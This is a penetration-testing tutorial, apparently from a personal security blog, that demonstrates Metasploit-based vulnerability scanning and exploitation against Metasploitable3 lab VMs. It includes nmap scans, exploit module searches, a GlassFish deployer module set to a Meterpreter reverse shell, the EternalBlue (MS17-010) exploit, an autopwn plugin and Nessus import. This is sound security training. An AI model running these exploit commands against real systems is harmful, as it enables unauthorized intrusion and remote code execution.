# Vulnerability Scanning

MSF **Auxiliary** and **exploit** modules can be utilized to identify inherent vulnerabilities in services, O.S. and web apps.

* Useful in the **Exploitation** phase of the pentest

ðŸ”¬ [Metasploitable3](https://github.com/rapid7/metasploitable3) lab environment will be used for the vulnerability scanning demonstration.

* **Metasploitable3** is a vulnerable virtual machine developed by Rapid7, intended to be used as a vulnerable target for testing exploits with Metasploit.

> ðŸ”¬ You can find my lab installation & configuration with Vagrant at [this page](https://blog.syselement.com/home/home-lab/redteam/metasploitable3), _set up for educational purposes_.

* Kali Linux attacker machine must be configured with **the same local network** of the Metasploitable3 VMs.

Detect active hosts on the local network, from the Kali VM:

```bash
sudo nmap -sn 192.168.31.0/24
```

```bash
Nmap scan report for 192.168.31.139 # Linux target
Nmap scan report for 192.168.31.140 # Windows2008 target
```

* Run Metasploit:

```bash
service postgresql start && msfconsole -q
```

```bash
db_status
setg RHOSTS 192.168.31.140
setg RHOST 192.168.31.140
workspace -a VULN_SCAN_MS3
```

* **Service version** is a key piece of information for the vulnerabilities scanning. Use the **`db_nmap`** command inside the MSF

```bash
db_nmap -sS -sV -O 192.168.31.140
```

```bash
[*] Nmap: 21/tcp    open  ftp Microsoft ftpd
[*] Nmap: 22/tcp    open  ssh OpenSSH 7.1 (protocol 2.0)
[*] Nmap: 80/tcp    open  http Microsoft IIS httpd 7.5
[*] Nmap: 135/tcp   open  msrpc Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
[*] Nmap: 3306/tcp  open  mysql MySQL 5.5.20-log
[*] Nmap: 3389/tcp  open  tcpwrapped
[*] Nmap: 4848/tcp  open  ssl/http Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)
[*] Nmap: 7676/tcp  open  java-message-service Java Message Service 301
[*] Nmap: 8009/tcp  open  ajp13 Apache Jserv (Protocol v1.3)
[*] Nmap: 8080/tcp  open  http Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)
[*] Nmap: 8181/tcp  open  ssl/http Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)
[*] Nmap: 8383/tcp  open  http Apache httpd
[*] Nmap: 9200/tcp  open  wap-wsp?
[*] Nmap: 49152/tcp open  msrpc Microsoft Windows RPC
[*] Nmap: 49153/tcp open  msrpc Microsoft Windows RPC
[*] Nmap: 49154/tcp open  msrpc Microsoft Windows RPC
[*] Nmap: 49155/tcp open  msrpc Microsoft Windows RPC
[...]
```

<figure><img src="https://blog.syselement.com/~gitbook/image?url=https%3A%2F%2F1996978447-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FlhjuckuLbvBn36EoFL7P%252Fuploads%252Fgit-blob-da30e0d4036528a13a9f80ff9d8b01fdd950c4eb%252Fimage-20230413200524969.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=7a28d970&#x26;sv=1" alt=""><figcaption><p>db_nmap</p></figcaption></figure>

```bash
hosts
services
```

* Manually search for a specific exploit
  * Check if there are any exploits for a particular **version** of a service

```bash
search type:exploit name:iis
```

<figure><img src="https://blog.syselement.com/~gitbook/image?url=https%3A%2F%2F1996978447-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FlhjuckuLbvBn36EoFL7P%252Fuploads%252Fgit-blob-375c51ac9321889fd7f66157154bed2363465c80%252Fimage-20230413192845621.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=6e8f5ea2&#x26;sv=1" alt=""><figcaption><p>search type:exploit name:iis</p></figcaption></figure>

```bash
search Sun GlassFish
```

* Check if a module will work on the specific version of the service

```bash
use exploit/multi/http/glassfish_deployer
info

# Description:
#   This module logs in to a GlassFish Server (Open Source or
#   Commercial) using various methods (such as authentication bypass,
#   default credentials, or user-supplied login), and deploys a
#   malicious war file in order to get remote code execution. It has
#   been tested on Glassfish 2.x, 3.0, 4.0 and Sun Java System
#   Application Server 9.x. Newer GlassFish versions do not allow remote
#   access (Secure Admin) by default, but is required for exploitation.
```

```bash
set payload windows/meterpreter/reverse_tcp
options
# check the LHOST, LPORT, APP_RPORT, RPORT, PAYLOAD options
```

* Use [searchsploit](https://www.exploit-db.com/searchsploit) tool from the Kali terminal, instead of `search MSF command`, by displaying only the Metasploit exploit modules

```bash
searchsploit "Microsoft Windows SMB" | grep -e "Metasploit"
```

<figure><img src="https://blog.syselement.com/~gitbook/image?url=https%3A%2F%2F1996978447-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FlhjuckuLbvBn36EoFL7P%252Fuploads%252Fgit-blob-ccd61dd756b19c9fe6732fd4bc6df233f08f8c9a%252Fimage-20230413194606641.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=1657eeca&#x26;sv=1" alt=""><figcaption></figcaption></figure>

* Back in `msfconsole`, check if the server is vulnerable to MS17-010

```bash
search eternalblue
use auxiliary/scanner/smb/smb_ms17_010
run
```

<figure><img src="https://blog.syselement.com/~gitbook/image?url=https%3A%2F%2F1996978447-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FlhjuckuLbvBn36EoFL7P%252Fuploads%252Fgit-blob-e9399a0e6c8efc589338f07390d7ad79f5433cf8%252Fimage-20230413200558380.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=8dc027dd&#x26;sv=1" alt=""><figcaption></figcaption></figure>

```bash
use exploit/windows/smb/ms17_010_eternalblue
options
# always check Payload options
run
```

> [**metasploit-autopwn**](https://github.com/hahwul/metasploit-autopwn) - a Metasploit plugin for easy exploit & vulnerability attack.
>
> * _takes a look at the Metasploit database and provides a list of exploit modules to use for the already enumerated services_

* On a Kali terminal

```bash
wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb
sudo mv db_autopwn.rb /usr/share/metasploit-framework/plugins/
```

* On `msfconsole`

```bash
load db_autopwn
```

```bash
db_autopwn -p -t
# Enumerates exploits for each of the open ports
```

```bash
db_autopwn -p -t -PI 445
# Limit to only the 445 port
```

<figure><img src="https://blog.syselement.com/~gitbook/image?url=https%3A%2F%2F1996978447-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FlhjuckuLbvBn36EoFL7P%252Fuploads%252Fgit-blob-aebfca43b742e41d758e63a2e3e6b0cdbc355643%252Fimage-20230413202435550.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=58548ba3&#x26;sv=1" alt=""><figcaption><p>db_autopwn -p -t -PI 445</p></figcaption></figure>

* On `msfconsole` use the **`analyze`** command to auto analyze the contents of the MSFdb (hosts & services)

```bash
analyze
```

<figure><img src="https://blog.syselement.com/~gitbook/image?url=https%3A%2F%2F1996978447-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FlhjuckuLbvBn36EoFL7P%252Fuploads%252Fgit-blob-f2413c550b79a3a1148a63bdb63d63dc5778b675%252Fimage-20230413202708057.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=46a076bc&#x26;sv=1" alt=""><figcaption><p>analyze</p></figcaption></figure>

```bash
vulns
```

<figure><img src="https://blog.syselement.com/~gitbook/image?url=https%3A%2F%2F1996978447-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FlhjuckuLbvBn36EoFL7P%252Fuploads%252Fgit-blob-ceda763cca80af814cb9304c543bd68cb4bb61f3%252Fimage-20230413202802181.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=66c66476&#x26;sv=1" alt=""><figcaption><p>vulns</p></figcaption></figure>

## VA with [Nessus](https://www.offsec.com/metasploit-unleashed/working-with-nessus/) <a href="#va-with-nessus" id="va-with-nessus"></a>

> ðŸ”¬ You can find [**Nessus Essentials** install tutorial here](https://blog.syselement.com/home/operating-systems/linux/tools/nessus).

* A vulnerability scan with Nessus result can be imported into the MSF for analysis and exploitation.
* Nessus Essentials free version allows to scan up to 16 IPs.

```url
https://127.0.0.1:8834
```

Start Nessus Essentials on the Kali VM, login and create a New **Basic Network Scan** and run it.

Wait for the scan conclusion and export the results with the **Export/Nessus** button.

<figure><img src="https://blog.syselement.com/~gitbook/image?url=https%3A%2F%2F1996978447-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FlhjuckuLbvBn36EoFL7P%252Fuploads%252Fgit-blob-986ff2afeccc2978f8dfefa575f9bdf4d236d58d%252Fimage-20230413222104319.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=8bc5023d&#x26;sv=1" alt=""><figcaption><p>Nessus Essentials - Metasploitable3</p></figcaption></figure>

* Open the `msfconsole` terminal and import the Nessus results
  * Check the information from the scan results with the `hosts`, `services`, `vulns` commands

```bash
workspace -a MS3_NESSUS
db_import /home/kali/Downloads/MS3_zph3t5.nessus
hosts
services
vulns
```

<figure><img src="https://blog.syselement.com/~gitbook/image?url=https%3A%2F%2F1996978447-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FlhjuckuLbvBn36EoFL7P%252Fuploads%252Fgit-blob-1562ae2abdb68d12d5245bf395d9dd026ad7295c%252Fimage-20230413222333897.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=c76ed34b&#x26;sv=1" alt=""><figcaption></figcaption></figure>

```bash
vulns -p 445
```

<figure><img src="https://blog.syselement.com/~gitbook/image?url=https%3A%2F%2F1996978447-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FlhjuckuLbvBn36EoFL7P%252Fuploads%252Fgit-blob-22fa84721de13f146690e31e9bde9df8926340e6%252Fimage-20230413222411974.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=864968e7&#x26;sv=1" alt=""><figcaption></figcaption></figure>

```bash
search cve:2017 name:smb
search MS12-020
search cve:2019 name:rdp
search cve:2015 name:ManageEngine
search PHP CGI Argument Injection
```







